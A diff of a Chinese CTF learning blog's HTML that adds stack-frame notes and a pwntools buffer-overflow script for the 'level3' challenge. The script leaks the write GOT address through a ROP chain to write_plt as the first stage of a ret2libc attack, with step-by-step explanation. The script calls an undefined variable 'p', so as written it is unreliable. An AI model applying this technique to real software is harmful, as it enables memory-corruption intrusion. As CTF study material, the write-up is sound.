@@ -253,7 +253,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2021-04-08 14:44:49" itemprop="dateModified" datetime="2021-04-08T14:44:49+08:00">2021-04-08</time>
+                <time title="Modified: 2021-04-08 16:49:32" itemprop="dateModified" datetime="2021-04-08T16:49:32+08:00">2021-04-08</time>
               </span>
 
           
@@ -276,6 +276,7 @@
 <p>函数开头：<br>1.分配栈帧大小（esp=esp-n）（之后用栈就往[esp+m]里写东西）<br>2.保存母函数的栈基地址于栈中（[esp+m1]=ebp）（母函数也有其栈帧）<br>3.确定子函数的栈基地址，即当前栈最新空着的地方（ebp=esp+m2）<br>函数中间：<br>执行该子函数在代码段的其它指令，其中栈会刚好用到esp+n处<br>函数结尾：<br>1.恢复ebp存储母函数的栈基地址（ebp=[esp+m1]）<br>2.释放该子栈帧的空间（esp=esp+n）</p>
 <p>ret指令只做两件事：<br>1.弹出返回地址 （eip=pop）<br>2.跳转</p>
 <p>这是函数嵌套调用时栈的模样：<br><img src="/2021/04/04/%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8-%E6%A0%88%E5%B8%A7/1.png" class></p>
+<p>PS：CGfsb遗留的问题至此解决</p>
 
       
     </div>
@@ -326,7 +327,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2021-04-03 11:53:17" itemprop="dateModified" datetime="2021-04-03T11:53:17+08:00">2021-04-03</time>
+                <time title="Modified: 2021-04-08 17:01:23" itemprop="dateModified" datetime="2021-04-08T17:01:23+08:00">2021-04-08</time>
               </span>
 
           
@@ -352,6 +353,11 @@
 <p>libc动态库：存放自带的可调用的功能性函数。</p>
 <img src="/2021/03/27/AD-level3/1.jpg" class>
 <h1 id="新增python、pwntools内容"><a href="#新增python、pwntools内容" class="headerlink" title="新增python、pwntools内容"></a>新增python、pwntools内容</h1><p>相关内容已经更新在“pwn用到的工具汇总”</p>
+<h1 id="边学边做"><a href="#边学边做" class="headerlink" title="边学边做"></a>边学边做</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = process(<span class="string">&quot;./level3&quot;</span>)</span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&#x27;./level3&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc_32.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">write_plt=elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got=elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">main_addr=elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;:\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="number">0x88</span>*<span class="string">&#x27;a&#x27;</span>+p32(<span class="number">0xdeadbeef</span>)+p32(write_plt)+p32(main_addr)+p32(<span class="number">1</span>)+p32(write_got)+p32(<span class="number">4</span>)</span><br><span class="line">p.sendline(payload)</span><br></pre></td></tr></table></figure>
+<p>现在程序执行到read函数中间<br>136个‘a’覆盖buf<br>再覆盖read函数中 存放母函数的ebp<br>接下来覆盖其返回地址为write_plt</p>
+<p>程序执行到read函数的ret，清空栈内包括write_plt之前的所有东西，跳转到write_plt</p>
+<p>对于write_plt<br>main_addr成了它的返回地址<br>1，write_got，4，成了它的参数</p>
+<p>于是成功泄露了write_got_addr，并返回main函数，用于其它操作。<br>即使这里main_addr改为其它地址，仍然成功能泄露write_got_addr。</p>
 
       
     </div>
